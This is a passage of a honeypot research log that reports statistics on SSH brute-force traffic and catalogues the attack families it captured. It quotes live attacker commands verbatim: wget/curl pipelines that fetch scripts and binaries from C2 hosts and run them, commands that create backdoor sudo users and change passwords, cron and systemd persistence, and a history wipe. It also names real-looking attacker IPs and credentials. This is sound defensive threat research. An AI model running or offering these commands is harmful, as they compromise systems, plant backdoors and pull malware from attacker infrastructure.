# Findings - 2144h on a public VPS

Helsinki VPS, port 22, fresh IP, no prior reputation.
Data: 2026-05-26 11:32 UTC to 2026-08-23 19:31 UTC.

```
  190862 auth attempts
    3069 unique source IPs
   48077 unique passwords tried
  188073 sessions accepted
14325037 commands captured
      22 attack families identified
```

*(Previous snapshot: 1546h, 105980 attempts, 2397 IPs, 103192 sessions, 10558841 commands -- 2026-07-29)*

## What changed Jul 29 -> Aug 23

```
                    Jul 29      Aug 23      delta
auth attempts       105980      190862      +84882
unique source IPs     2397        3069        +672
sessions accepted   103192      188073      +84881
commands captured 10558841    14325037    +3766196
unique passwords     41301       48077       +6776
```

- **Biggest window yet: +84882 attempts in ~598h.** That is ~3400/day against ~1650/day
  for the whole previous run. Two single-day spikes carry most of it: 2026-08-03 alone is
  50905 attempts, and 2026-08-19 is 23835. Baseline days are still ~200-400.

- **Seven new families.** Three appeared in August: F16 perl dropper (Aug 20), F17
  authorized_keys injector (Aug 17, single 4h burst), F18 SSH key + scp transport (running
  since June but only isolated now). Four more came out of sequence-grouping the whole
  dataset rather than from new traffic -- they were always there, too low-volume to see
  until every session was hashed and grouped: F19 MikroTik/Telegram/SMS hunter, F20 busybox
  IoT probe, F21 dd + /dev/tcp binary push, and a combined recon-variants section. See
  sections 16-22.

- **Low volume is not low interest.** F19 is 6 sessions and F21 is a single session, but
  they are the two most technically distinct things in the dataset -- Telegram session
  theft plus SMS-gateway hunting, and a 1.9MB UPX binary pushed through the SSH channel
  with `dd`. Ranking families by session count would have buried both. Worth remembering
  before I put a "top families" chart in the blog post.

- **F15 exploded.** The `echo -e "\x6F\x6B"` beacon went from 14954 sessions to **139336**
  -- 95% of every session that ran a command. Still 8 IPs. One family now dominates the
  session count the way F10 dominates the command count.

- **The tail is thin.** Sequence-grouping all 147097 sessions that ran at least one command
  gives 2738 distinct command sequences, but 2611 of those are one-offs and only 50
  sequences have 6+ sessions. Almost all traffic is a handful of bots repeating themselves
  exactly.

- **Delivery is moving off `wget | sh`.** F16 pipes to perl, F18 pulls over scp with its own
  private key, F17 skips payloads entirely and just installs an SSH key. Three independent
  families in one window all avoiding the pattern every detection rule greps for.

- **Numbers caveat.** The merged log for this window contained duplicated records (my merge
  error -- logrotate `dateext` names a file for the day the rotation ran, not the day it
  covers, so 07-29 got spliced twice, and the legacy `.1.gz` block got prepended when it was
  already present). Everything above is deduplicated: 11302 auth and 284291 session records
  dropped before counting. The Jul 29 column is from a merge verified clean, so the deltas
  are comparable.

## What changed Jul 19 -> Jul 27

```
                    Jul 19      Jul 27      delta
auth attempts        94548      97463       +2915
unique source IPs     2218       2356        +138
sessions accepted    91760      94675       +2915
commands captured  8321833    9772217     +1450384
unique passwords     38533      40161       +1628
```

- **Quiet window this time -- no single-IP spike.** +2915 auth attempts and sessions in
  ~180h, spread at baseline (~360/day). Unlike Jul 14 and Jul 18, no single host ran a
  mega root-brute this window; the all-time top sprayers (`165.227.238.235`,
  `161.97.166.185`) are carry-over from earlier windows, not new activity. Unique IPs +138.

- **Commands +1.45M, still all F10.** The ELF echo injector remains the sole command driver
  -- echo stays ~99.5% of all commands. No mega-session this window; F10 just keeps dumping
  steadily across days. Commands crossed 9.77M.

- **SSHCHK is now the #1 family by sessions.** 57975 sessions -- 63% of every accepted
  session. It's the math-proof-of-work token bot (BEGIN/END handshake), and it lines up
  exactly with the 57660 `echo -e "\x6F\x6B"` ok-beacons. Worth stressing: the
  command-count view (99.5% echo) hides this completely, because SSHCHK is a handful of
  commands per session while F10 is 40k echo chunks per session. Families-by-session is the
  truer picture of *who's knocking* -- and by that measure F10 is only 201 sessions.
  Command volume and session volume tell two different stories; I need both on the report.

- **Coordinated Postgres spray.** Two credentials show up sprayed across many IPs in a
  tight window: `postgres / e3@HJgr=$4in-a-` from 57 IPs in 59 min, and
  `postgres / postgres` from 51 IPs in 58 min. 50+ distinct hosts hitting the *same*
  credential inside an hour is botnet coordination, not independent scanners -- a
  Postgres-targeted campaign running through shared infrastructure. Distinct from the root
  brute noise.

- **89% Go banner, 87% root.** `SSH-2.0-Go` is 84382 / 94548 of attempts, `user=root` is
  82170 / 94548. Almost nothing here is human-interactive -- it's automated Go-based mass
  scanners aimed at root. That ratio has held all three windows.

- **Payloads: nothing new of substance.** 33 `scp payload saved` events, 4 distinct
  sha256. Three are known -- the SCP-dropper worm (`6d1fe6ab...`, 18x, 4745B random names)
  and the two F14 capability probes (`e374a7ad...` 512B, `f74a8b06...` 348B). One new
  27-byte hash (`751debd4...`, 1x) -- single occurrence, almost certainly a test probe, not
  triaged (files weren't in this pull, only the logged hashes).

- **The dataset has plateaued structurally.** +77h, +20k attempts, +564k commands, but zero
  new families, same four echo targets (`/tmp/amd64|kal64|linux|kswpad`), same
  systemd+cron persistence playbooks. What's growing is volume, not novelty. That's itself
  the finding for this window.

- **Action item for the tooling:** both single-IP spikes (Jul 14, Jul 18) would've been
  obvious instantly with a per-IP dominance line in report.py -- "top IP = X% of all
  attempts". Without it a lone sprayer quietly doubles the totals and makes the dataset look
  busier than it is. Build it before the next pull.

## What changed Jul 9 -> Jul 16

```
                    Jul 9       Jul 16      delta
auth attempts        38515      74268      +35753
unique source IPs     2012       2161        +149
sessions accepted    35727      71480      +35753
commands captured  6640574    7758177    +1117603
unique passwords     18986      30596      +11610
```

- **The whole jump is one IP on one day.** 2026-07-14 logged 34008 auth attempts vs
  ~200-360 on every other day. A single new host, `165.227.238.235` (DigitalOcean range),
  ran 33825 of them -- all `user=root`, 01:00-09:00 UTC, ~1.2/sec sustained for 8h. That
  one run is essentially the entire +35753 in both attempts and sessions (they move
  together at threshold 1). Source IPs only +149 because it's one IP adding huge volume,
  not a broad new wave.

- **That IP also drove the password jump.** +11610 unique passwords over the window;
  `165.227.238.235` alone tried 22320 unique passwords -- a large root-focused wordlist
  spray. It did not stop to run a shell, so it added almost nothing to the command count.

- **Commands +1.12M, still all F10.** The ELF echo injector remains the sole command
  driver -- echo is 99.5% of all commands and 99.5% of every recent day (~150-320k
  commands/day). No single mega-session this window; the growth is F10 running steadily
  across days, not one long dump.

## What changed Jun 26 -> Jul 9

```
                    Jun 26      Jul 9       delta
auth attempts        25339      38515      +13176
unique source IPs     1516       2012        +496
sessions accepted    22551      35727      +13176
commands captured  4298306    6640574    +2342268
unique passwords     13629      18986       +5357
```

## What changed Jun 25 -> Jun 26

One day of data, steady state. No new family.

```
                        Jun 25        Jun 26        delta
auth attempts            25026         25339         +313
unique source IPs         1463          1516          +53
sessions accepted        22238         22551         +313
commands captured      4047599       4298306       +250707
unique passwords         13506         13629         +123
```

- **ELF echo injector (F10) still the sole command driver.** +250k commands in ~25h.
  Period 9 echo count: 4,273,296 out of 4,297,018 total commands in that period.
  Session count now ~102 (45.12.1.49: 66 sessions, 152.89.61.139: 36 sessions).

- **`\ufeff------fuck------` climbed to 155, `---fuck_you----` to 80.** Both entered
  the top 12. The BOM-prefix artifact persists -- same wordlist, same copy-paste origin.

- **`1234` nearly tied `123456`.** 302 vs 304, both behind `admin` (674). The gap
  between them closed significantly since Jun 25.

- **AsyncSSH Vietnamese cluster: 956 sessions total** (from 27.79.x.x, 116.99.x.x,
  116.110.x.x, 171.231.x.x, 171.243.x.x ranges). Still the main source of new IPs.

- **Credential feedback loop: 12 confirmed passwords, 8 still pending loop-back.**
  One candidate crossed back since Jun 25. Pending: 8 chpasswd-only passwords watching.

Per-family session counts as of Jun 26 (estimate -- fingerprint detector):

```
SSHCHK             ~15200+  (main IP 103.105.67.170 still frozen at 14793)
astats / w.sh         910+  (was 900+)
minimal scanner       245+  (was 240+)
ELF echo injector     102   (was ~90, two source IPs: 45.12.1.49 + 152.89.61.139)
password changer      147+  (was 146+)
meow + C2 dropper     115+  (was 115+)
Diicot GPU miner       49   (unchanged)
VPS scout              37   (unchanged)
```

---

## What changed Jun 21 -> Jun 25

Four more days, mostly steady-state. No new family.

```
                        Jun 21        Jun 25        delta
auth attempts            23993         25026        +1033
unique source IPs         1279          1463         +184
sessions accepted        21205         22238        +1033
commands captured      3518383       4047599       +529216
unique passwords         13099         13506         +407
rejected                  2788          2788            +0
```

- **ELF echo injector (F10) keeps driving the command count.** +529k commands in 4 days,
  almost entirely `echo` chunks. Still ~4-6 sessions/day from 152.89.61.139 (Ukraine) and
  45.12.1.49. C2 IPs 195.177.94.72:564 and 45.88.91.135:35146 remain unreachable so
  every session falls back to hex injection.

- **`admin` overtook `123456` as top password.** 657 vs 299. Possibly a change in the
  dominant wordlist rotation hitting the IP; previously they were close.

- **Two new passwords in the top 12:** `alpine` (92) -- Alpine Linux / container default --
  and `lab123` (82), which suggests educational-environment targeting. Both are new enough
  that they weren't in the Jun 21 top list.

- **AsyncSSH Vietnamese cluster still expanding.** Another +60 IPs (27.79.x.x VNPT,
  116.99.x.x, 116.110.x.x, 171.231.x.x, 171.243.x.x). Each IP sends 15-50 attempts
  then goes quiet; the cluster rotates through residential ranges.

- **BOM-prefixed credentials growing.** `\ufeff------fuck------` 125 -> 146,
  `---fuck_you----` 69 -> 76. Unusual encoding -- the BOM prefix suggests the wordlist
  was copy-pasted from a Windows editor at some point and the artifact stuck.

- **`103.105.67.170` (SSHCHK) still frozen at 14793.** No new traffic from that IP
  since Jun 15. SSHCHK total session count likely still climbing from other IPs
  in the same infrastructure.

- **Credential feedback loop now has 12 confirmed passwords** (same chpasswd values seen
  again as login attempts from different IPs). 9 additional candidate passwords in the
  chpasswd stream have not yet looped back.

Per-family session counts as of Jun 25 (estimate -- fingerprint detector):

```
SSHCHK             ~15200+  (main IP frozen, others still scanning)
astats / w.sh         900+  (was 870)
minimal scanner       240+  (was 235)
password changer      146+  (was 144)
meow + C2 dropper     115+  (was 113)
ELF echo injector      90+  (was 84)
Diicot GPU miner        49   (unchanged)
VPS scout               37   (unchanged)
```

---

## What changed Jun 15 -> Jun 21

The two things that drove the last snapshot both went quiet, and two slower
trends took over.

```
                        Jun 15        Jun 21        delta
auth attempts            22104         23993         +1889
unique source IPs          923          1279          +356
sessions accepted        19316         21205         +1889
commands captured      2544806       3518383       +973577
unique passwords         12298         13099          +801
rejected                  2788          2788            +0
```

- **SSHCHK plateaued.** 15071 -> 15106 sessions (+35 in six days). The ~940/day
  flood that defined Jun 10-15 stopped almost dead around Jun 15. The IP behind
  most of it, `103.105.67.170`, is frozen at 14793 attempts -- zero new traffic.
  Whatever scanning list we were on got rotated off, or that node went down.

- **ELF echo injector (F10) accelerated.** 62 -> 84 sessions (+22), +856k echo
  chunks. It is now the sole driver of the command count -- nearly all of the
  +973k new commands are its hex `echo` chunks. `/tmp/amd64`, `/tmp/kal64` and
  `/tmp/linux` all grew; `/tmp/kswpad` is frozen at 229,971 (the new sessions
  ended or branched before re-injecting it).

- **AsyncSSH Vietnamese cluster expanded.** The `SSH-2.0-AsyncSSH_2.1.0` banner
  went 728 -> 896, spread across ~40 distinct residential IPs (27.79.x.x VNPT,
  171.231.x.x, 116.99.x.x, 116.110.x.x). This Python credential-stuffing botnet
  is now the main source of *new* unique IPs.

- **Scanner tooling diversified.** PuTTY_0.84 558 -> 1213, OpenSSH_7.4 346 -> 854,
  plus first sightings of `paramiko_5.0.0`, `ssh2js1.17.0` (Node.js ssh2 lib),
  `AsyncSSH_2.23.0`, `OpenSSH_10.3p1`, and the `libssh_0.11.3 / 0.10.5 / 0.7.4`
  family.

- **Credential feedback loop persists.** New post-accept loop IPs: `41.250.181.190`
  (18), `196.69.82.45` (9), `105.158.231.168` (9). The Diicot spray
  (`postgres` / `e3@HJgr=$4in-a-`, 57 IPs in 59 min) is unchanged. The obnoxious
  BOM-prefixed `------fuck------` (125) and `---fuck_you----` (69) credentials
  climbed; `nutanix/4u` (39) and `ubnt` (37) appear as new IoT defaults.

- **No new family.** Still 14. 17 sessions flagged SCP uploads this window (F13
  worm / F14 region); quarantine not re-pulled yet, so no new payload confirmed.

Per-family session counts (fingerprint detector) as of Jun 21:

```
SSHCHK             15106   (was 15071 on Jun 15)
astats / w.sh        870   (was   714)
minimal scanner      235   (was   189)
password changer     144   (was   135)
meow + C2 dropper    113   (was   113)
ELF echo injector     84   (was    62)
Diicot GPU miner      49   (was    49)
VPS scout             37   (was    37)
```

---

## Why medium interaction, not low

I started this project aiming for low interaction -- just log auth attempts and see what
credentials bots try. That was the plan.

Then the first logs came in. I saw a GPU miner checking lspci and nvidia-smi. I added
fake GPU output, and suddenly the miner ran its full kill chain instead of exiting. I was
getting real behavior, not just credential lists.

Then I saw the SCP dropper trying 11 directories. I added the SCP wire protocol so the
bot thought its uploads worked and kept going. I added a quarantine directory so I could
capture what it actually sent.

By June 2 the quarantine had caught a real payload -- a Raspberry Pi SSH worm. The ELF
echo injector had dropped four binaries into the session FS. The SSHCHK proof-of-work
was passing because I'd implemented arithmetic expansion with a real recursive descent
parser.

At some point the "low interaction" label stopped being accurate. The code has a stateful
per-session virtual filesystem, ~80 registered command handlers, real pipe chains (stdout
fed as stdin to the next stage), `$((expr))` arithmetic expansion, and the full SCP wire
protocol on both the exec and interactive shell paths. That is medium interaction by any
reasonable definition -- it is closer to Cowrie than to a simple auth logger.

The gaps are real: no `$(cmd)` substitution, no `> file` writes, no live network. But
those gaps do not push it back to low. Low means no shell. This has a shell.

---

## Timeline

Not continuous. Two big waves, one quiet day.

```
2026-05-26     88 commands  -- first bots, mixed families
2026-05-27    545 commands  -- Diicot heavy day
2026-05-28     10 commands  -- quiet
2026-05-29    174 commands  -- threshold=1 deployed, new families appear
2026-05-30  60206 commands  -- family 10 first session, 78min, 4 binaries
2026-05-31 102653 commands  -- family 10 again, family 11 first appearance
2026-06-01 100196 commands  -- family 10 hits 4x, family 6 surge (7 hits in 2h)
2026-06-02 ~507000 commands -- F10 dominates, new 1h9min session (0256bdb274ae), F12 and F13 confirmed
2026-06-03  ~1800 commands  -- quiet, ongoing
2026-06-04  ~7100 commands  -- partial day (data up to 21:37 UTC)
2026-06-06 to 06-09        -- F13 SSH worm returns 3 more times (same hash, same bot)
2026-06-10 to 06-11        -- SSHCHK surge, ~940 sessions/day sustained
2026-06-12  F14 first hit  -- architecture prober (hw.bin), 2 ELF test binaries via SCP
2026-06-14                 -- F13 worm hits again (5th quarantine capture total)
2026-06-15  ongoing        -- F10 echo injector at 62 sessions total, 2.44M chunks
2026-06-22 to 06-25       -- steady state: F10 still injecting (~4-6/day), AsyncSSH cluster
                              still expanding (+~60 IPs), no new family, admin overtakes
                              123456 as top credential (657 vs 299)
2026-06-26                -- steady state continues: F10 at ~102 sessions, +250k commands/day,
                              \ufeff------fuck------ and ---fuck_you---- both enter top 12,
                              1234 nearly ties 123456 (302 vs 304)
```

Peak: 22:00 UTC, 1321 total attempts across all sessions at that hour (1279 on 2026-05-27 alone).

Almost everything is `SSH-2.0-Go` -- the scanning ecosystem runs on Go's ssh library.
No OpenSSH overhead, thousands of connections per second from a laptop.

---

## Attack families

### 1. Credential stuffing

A wordlist + a script that tries every password on every IP it can reach. That's it.

Works because people reuse passwords. A breach at site A leaks millions of real passwords.
Some of those work at site B. The bot doesn't know your password -- it knows A password
that has a decent chance of being yours.

Top passwords: `123456`, `admin`, `postgres`, `password`, `1234`. All from the RockYou
wordlist, 14 million passwords from a 2009 breach, still the standard.

One IP (`71.227.179.172`) tried 1545 passwords then made 1382 more after getting in.
It's not stopping when it gets a shell -- it wants every working credential, not just one.

One bot sent ~80 passwords in `YYYYMMDD` format (19870825, 19831215...) mixed with
Chinese names (yangchao, wangming, xiaodong). Birth years 1982-1991. That's a real
breach dataset from China, not guessing.

---

### 2. Diicot -- GPU miner

Dominant family. ~180 sessions. Wants to mine Monero on GPU servers.

Monero = cryptocurrency, untraceable, GPU-minable. A Tesla T4 makes real money mining it.
The bot is picky -- it only deploys on machines worth mining on.

Kill chain:

```bash
uname -s -v -n -r -m    # is it Linux x86_64? if not, exit
nproc                    # CPU count
lspci | egrep VGA && lspci | grep 3D    # GPU on the PCI bus?
nvidia-smi -q | grep "Product Name"     # which GPU exactly?
```

Our fake `lspci` shows a Tesla T4. That triggered the next step:

```bash
crontab -r                              # wipe all cron jobs
chattr -iae ~/.ssh/authorized_keys      # make authorized_keys immutable
rm -rf /dev/shm/.x /...                # kill competing miners
```

`chattr -i` is below normal Unix permissions -- even root can't touch that file without
removing the flag first. Once this runs, no other attacker can add their SSH key.
The machine is claimed.

Named after Romania's anti-corruption agency -- the malware author is trolling.

![Diicot session replay](https://github.com/user-attachments/assets/edacfeef-b426-4030-91e7-77dce0e288a1)

*Session dc727dd9b39f -- 10 commands, 36s. The last exec line is the full kill chain: wipes crontab, locks authorized_keys with chattr, kills competing miners, then deploys.*

---

### 3. SCP dropper

One session 2026-05-26 17:50. Tried 11 directories looking for a writable path:

```bash
mkdir /lib/xlxeavrjsw      ; scp -t -r /lib/xlxeavrjsw/
mkdir /dev/shm/omlvyoqxmgd ; scp -t -r /dev/shm/omlvyoqxmgd/
mkdir /tmp/cygmfsqpwkgd    ; scp -t -r /tmp/cygmfsqpwkgd/
# ... 8 more
```

`scp -t` = server-side receive mode. The bot pushes a file from its machine to ours.
Random 10-char dir names to avoid collisions.

The honeypot speaks the SCP wire protocol (sends the ready byte, parses headers, acks),
so the bot thought all 11 uploads worked. Nothing was actually received.

![SCP dropper session replay](https://github.com/user-attachments/assets/aecd3729-b9b7-4652-a378-2e89c77c753e)

*Session d22ff677d549 -- 22 commands. Each line is a different directory tried: mkdir then scp -t immediately after. Systematic bruteforce, random 10-char names, all returned exit 0.*

---

### 4. Password changer

4 sessions, 2026-05-26 22:xx to 2026-05-27 01:xx.

```bash
cat /etc/passwd
passwd
echo 'root:$MWtB6=$e6mK#=E' | chpasswd
```

Changes the root password to lock out other attackers. Tries interactive `passwd` first,
falls back to `chpasswd` which reads from stdin -- no terminal needed.

Passwords seen: `i5n#_o$_6qFK!$s` and `$MWtB6=$e6mK#=E`. Strong, machine-generated.
The logic: bots are scanning the same ranges simultaneously. Get in first, change the
password, nobody else can use the machine.

![Password changer session replay](https://github.com/user-attachments/assets/b9b6c1dd-5c43-4277-9569-43f7c9bea317)

*Session 29e4813a04ad -- 4 commands, 2s. `passwd` fails silently, falls back to `chpasswd` with a machine-generated strong password. The whole thing runs and exits before a human could type the first command.*

---

### 5. C2 dropper -- fileless

First appeared 2026-05-29 07:56, 1h41m after switching to threshold=1.
Multiple IPs, same payload.

```bash
uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; \
(wget --no-check-certificate -qO- https://14.46.136.77/sh \
 || curl -sk https://14.46.136.77/sh) | sh -s ssh
```

Three things:
- `uname -a` -- OS info sent back to C2
- `echo -e "\x61..."` -- decodes to `auth_ok`. Signals the C2 that auth worked.
- `wget ... | sh` -- downloads a script and runs it directly in memory. Nothing on disk.

No file = nothing for antivirus to find. The script runs and exits, only evidence is
in memory and process table while running.

`-s ssh` tells the script how it got in. Same dropper used for web exploits and RCE --
the entry vector changes what persistence it sets up.

Ran via SSH exec channel (not interactive shell) -- the original scripts missed it entirely.

![C2 dropper session replay](https://github.com/user-attachments/assets/f3d5c7ac-23b3-416e-99b1-3b3d30c87681)

*Session a7a62f0046ee -- 1 command, 0s. The hex in the echo decodes to `auth_ok` -- it beacons the C2 that authentication succeeded before pulling and executing the payload.*

---

### 6. w.sh / astats -- persistence bot

First 2026-05-29 14:17. Hits every 30-45min from different IPs.

```bash
# find writable dir
sh -c 'for d in /dev/shm /tmp /var/run ...; do cd "$d" && pwd && break; done'
# drop script
cd "/tmp" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
# cron persistence
CRON="$(crontab -l 2>/dev/null || true)"
# systemd persistence
sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service'
# drop miner
cat > astats
```

Two persistence mechanisms at once -- cron AND systemd user service. Remove one,
the other revives the miner.

Process names: `astats`, `netai`, `kstats`. Look like monitoring tools in `ps aux`.

![w.sh persistence session replay](https://github.com/user-attachments/assets/bf690f31-1d52-4128-a76e-ed1577627ff3)

*Session 95bd06bfef71 -- 11 commands, 9s. Cron entry and systemd service written in the same session. The last three lines drop the miner binary three times -- /dev/shm first, then /tmp as fallback.*

---

### 7. VPS infrastructure scout

Two sessions 2026-05-29. 35 commands, no payload.

Checks everything: CPU model, distro (apt/yum/pacman/zypper), network interfaces,
running services, shadow file, disk I/O with `dd`, outbound connectivity via ping.

The `dd bs=1M count=10` benchmark is the tell -- it's measuring disk speed before
deciding if the machine is worth deploying a miner on.

Ended without deploying anything. Machine failed some criterion or it's a pure probe
that reports back to a queue.

![VPS infrastructure scout session replay](https://github.com/user-attachments/assets/1faf3375-df10-4e32-a862-4b16f35a7631)

*Session e1877e76a176 -- 35 commands, no payload. Checks package managers, disk speed, network, shadow file. Ends without deploying anything -- the machine passed or failed some internal scoring and the result went back to a queue.*

---

### 8. SSHCHK -- C2 liveness check

**~15,200+ sessions as of Jun 26** (~940/day from June 10-15, then plateaued -- main IP 103.105.67.170 frozen at 14793 since Jun 15, other IPs in the same infrastructure still trickling). Started with 2 sessions on May 30.

2026-05-30 02:20 and 02:23. Two sessions, different IPs, 3 min apart.

```bash
echo SSHCHK_5718926f9304_BEGIN; uname -srm; echo $((7*191+3)); hostname; \
df -P / 2>/dev/null | awk 'NR==2{print $1}'; echo SSHCHK_5718926f9304_END
```

Four things:
- `BEGIN`/`END` markers -- C2 extracts everything between them. Token is unique per
  session, prevents replay attacks.
- `uname -srm` -- OS + kernel + arch
- `echo $((7*191+3))` = 1340 -- math proof-of-work. Shell must evaluate it. A fake
  or broken shell returns the wrong answer.
- `df -P / | awk 'NR==2{print $1}'` -- device name of root filesystem

No follow-up commands. Pure inventory probe -- C2 reads the output and decides
what to send next, externally.

We had to fix the fake shell to pass this check: add arithmetic expansion `$((expr))`,
awk NR==N condition, df -P flag, uname -srm case.

![SSHCHK session replay](https://github.com/user-attachments/assets/3b196728-b5e0-421a-886a-64d695017e4e)

*Session f63b5f809061 -- 1 command, 0s. The token `5718926f9304` is unique to this session. The C2 strips everything between BEGIN and END and parses the output -- OS, kernel, proof-of-work result, and disk device -- without ever asking for them separately.*

---

### 9. Minimal OS scanner

2026-05-30 06:03 and 07:39. Two sessions, different IPs, 1h36m apart.

```bash
uname -s -m
```

Just that. Gets "Linux x86_64", disconnects. Either cataloguing the internet or
a first-stage probe before a payload bot follows up.

![Minimal OS scanner session replay](https://github.com/user-attachments/assets/2dbdbac5-b83e-4568-a333-b67fd9cd11dd)

*Session d52879b810e9 -- 1 command, 3s. Gets the answer it needs and disconnects immediately. Lightest possible post-auth probe in the dataset.*

---

### 10. ELF echo injector

**~102 sessions total as of Jun 26. ~4,273,296 echo commands in period 9 alone. Still the sole driver of the command count.**
Two source IPs: 45.12.1.49 (66 sessions) and 152.89.61.139 (36 sessions).
session.log is well over 3.3GB mostly because of this family. kswpad was frozen
since June 15 -- the newest sessions appear to skip or branch before re-injecting it.

Single session eb342541b5, 2026-05-30 12:18-13:36 Rabat (78 minutes).
Source IP: 152.89.61.139 (Ukraine). Appeared 17 minutes after deploying the new binary.

Four binaries, injected in sequence. Each one: arch check, try wget then curl from two
C2 servers, fall back to hex echo injection when downloads fail, chmod 777, execute,
delete, then move to the next binary.

```
amd64  -- 5MB, 64-bit Go, stripped
kal64  -- 3MB, 64-bit Go, stripped
kswpad -- 1.2MB, ELF 32-bit x86
linux  -- 1.3MB, ELF 32-bit x86, UPX packed
```

C2 servers tried:
- 195.177.94.72:564 and 195.177.94.72:3594 (two ports, same server)
- 45.88.91.135:35146

Both refused connections (fake wget returns errors). So the bot wrote all four binaries
as hex via 43,058 `echo -e -n` chunks -- the entire payload delivered inside the SSH
session itself.

Each server exposes three path prefixes per binary: `/b/`, `/s/`, `/t/`. Meaning of `/t/`
unknown -- `/b/` and `/s/` are likely "binary" and "script" but `/t/` has no obvious read.

`\x7f\x45\x4c\x46` = ELF magic number. Every Linux binary starts with these 4 bytes.

This is in-band payload delivery -- the payload travels inside the attack, no separate
download needed. Used when outbound HTTP is blocked. The bot carries its full toolkit
in memory and reconstructs it on the target via shell.

All four were chmod 777'd, executed, and deleted. Session ended at 13:36 after `linux`
was deleted. 43,058 echo commands total.

Binary analysis pending -- all four recoverable from session.log hex chunks, also
downloadable from the C2 servers (still live as of 2026-05-30). Haven't done the
Ghidra work yet.

Hit a second time on 2026-05-31 (session eadedac033be). Started 08:37 Rabat, ended
10:58 Rabat -- 1h21min, 43,314 log lines. Same kill chain, same C2 IPs, path changed
from `/b/amd64` to `/s/amd64`. Same four binaries in the same order. C2 still live.

Hit again on 2026-06-02 (session 0256bdb274ae, 45.12.1.49). Started 13:35 Rabat, ended
14:45 Rabat -- 1h9min. Same C2 IPs (195.177.94.72:564, 45.88.91.135:35146), same
`/s/amd64` path, same fallback to hex echo injection when downloads fail. Period 9
total: 506,989 echo commands -- F10 has run enough times to dwarf everything else combined.

![ELF echo injector session replay](https://github.com/user-attachments/assets/ed4eb32e-6d1a-4cf4-b9df-5dc2f4aa6cf8)

*Session eadedac033be -- 43,314 commands, 1h21min. Each block is one binary written as hex chunks via echo. wget/curl tried first, failed, then the bot rebuilt the entire payload from shell commands alone.*

---

### 11. Meow dropper -- backdoor + credential harvesting

**113 sessions as of June 21 (unchanged since June 15).** C2 infrastructure expanded: two new IPs added around June 5.
- 34.11.111.237 -- original (May 31)
- 35.237.91.38 -- new
- 34.181.210.37 -- new

All three serve the same `/meow` and `/meowarm64` binaries with the same kill chain.

Two hits 2026-05-31 01:09 and 01:12 UTC, from different IPs, same C2 at 34.11.111.237.

```bash
cd /tmp; ulimit -n 1020000; rm -rf meow*
wget http://34.11.111.237/meow; chmod 777 meow; ./meow
wget http://34.11.111.237/meowarm64; chmod 777 meowarm64; ./meowarm64
echo $(whoami):modzmodz | chpasswd
useradd -m -s /bin/bash admin1; echo admin1:modzmodz | chpasswd; usermod -aG sudo admin1
useradd -m -s /bin/bash user1; echo user1:modzmodz | chpasswd
echo -n 'root:webserver' > /tmp/mew
```

Drops both x86-64 and ARM64 binaries in one shot -- covers both architectures without
checking first. Creates two persistent backdoor users (admin1, user1) both with sudo.
Changes the current user's password to `modzmodz` too.

The `/tmp/mew` line is the tell: writing a credential string to a predictable path.
The second hit had `root:fuck123` instead of `root:webserver` -- same tool, different
parameter. Either two operators sharing the same infrastructure, or a parameterized
campaign where each node gets a different credential to harvest.

Entire kill chain in a single command, run via SSH exec channel (not interactive shell).
No recon, no persistence check -- just drop, execute, and leave.

Binary analysis not done yet. What `meow` actually does is unknown.

A second activity from the same C2 server (197.255.229.88:1987, unrelated to the three
GCP IPs above) was observed in the Jun 26 replay: SSH key injection via `/kon` appended
to `~/.ssh/authorized_keys`, then a secondary payload fetched from `/fav.ico`. The fetch
uses a 6-method fallback chain: curl -> wget -> python3 urllib -> python2 urllib -> perl
LWP -> raw TCP socket with bash /dev/tcp. More robust than anything else in the dataset.
Whether this is the same operator or a different one using overlapping infra is unknown.

![Meow dropper session replay](https://github.com/user-attachments/assets/5b7e6e81-b730-4e4d-a46d-22cda6b06815)

*Session 72a973e0ba30 -- 1 command, 7s. The entire kill chain in a single exec: download, execute, create two backdoor users, change password, write credential to /tmp/mew. Done before you could read the first line.*

---

### 12. wowo dropper -- deploy and vanish

One session June 2 01:53 UTC, session d9ddf36a96. Source IP 172.210.53.193.

```bash
chmod 777 /usr/bin/curl
cd /tmp
curl -O http://wowo.biz.id/wowiloveyou/runningaway.x86
chmod 777 runningaway.x86
./runningaway.x86 vipies
rm -rf runningaway.x86
history -c
```

Downloads a binary called `runningaway.x86` from `wowo.biz.id`, executes it with
argument `vipies`, deletes it, wipes history. The argument is probably a campaign tag --
different operators or deployments get different tags so the C2 can track them.

`chmod 777 /usr/bin/curl` at the start is unusual. Either it's fixing permissions a
previous attacker broke, or it's a habit from environments where curl gets locked down.

I don't know what `runningaway.x86` does. I haven't analysed it. The domain `wowo.biz.id`
is Indonesian (.id TLD, .biz subdomain). Beyond that I have nothing. The session came
from the same IP as F13 (172.210.53.193) which is interesting -- same machine running
multiple families, or same campaign infrastructure.

Session preceded by a full F7-style 35-command recon (session 517b6d0aebb3). The wowo
deploy only happens if the recon passes some internal check. I need to understand what
that check is.

TODO: check if wowo.biz.id/wowiloveyou/runningaway.x86 is still live, analyse the binary,
figure out the relationship between F7 recon and F12 deploy.

![wowo dropper session replay](https://github.com/user-attachments/assets/b713385b-9600-4ca9-8665-757db0aff1dd)

*Session d9ddf36a96d3 -- 172.210.53.195, 41 commands. Full 35-command infrastructure recon
first, then the payload drop at the end. One IP doing both halves in a single session.*

---

### 13. gJw27HGL -- SSH worm (two-bot pattern)

**5 quarantine captures: Jun 2, Jun 6, Jun 8, Jun 9, Jun 14. Same 4.7KB script every time
(sha256: 6d1fe6ab3cd04ca5d1ab790339ee2b6577553bc042af3b7587ece0c195267c9b). Still active.**

Two sessions June 2 09:40 UTC. What looked like a coordinated two-stage attack: one bot
uploads a file to `/tmp/gJw27HGL` via SCP, a different IP executes it. The executor
actually showed up 3.5h earlier at 06:06 -- before the upload. They're not coordinated,
they just both hit the honeypot independently.

The quarantine captured the payload. It's a bash script, 4.7KB. I haven't done a proper
analysis yet -- I know what's in it from reading the source but I don't understand the
full picture: what the IRC channel is used for, who operates it, what the binaries it
references actually do, whether it's a known family. What I can see from the script:

- kills a list of competing processes before doing anything
- adds an SSH key to /root/.ssh/authorized_keys
- connects to IRC and waits for commands
- spreads itself via SSH using `sshpass` with hardcoded passwords

The passwords it tries are Raspberry Pi defaults. So it's targeting Pi devices, not
generic servers. Why it hit a Helsinki VPS running Ubuntu I don't fully understand yet --
probably just spraying everything on port 22.

This is the first real attacker payload the quarantine actually captured. Previous file
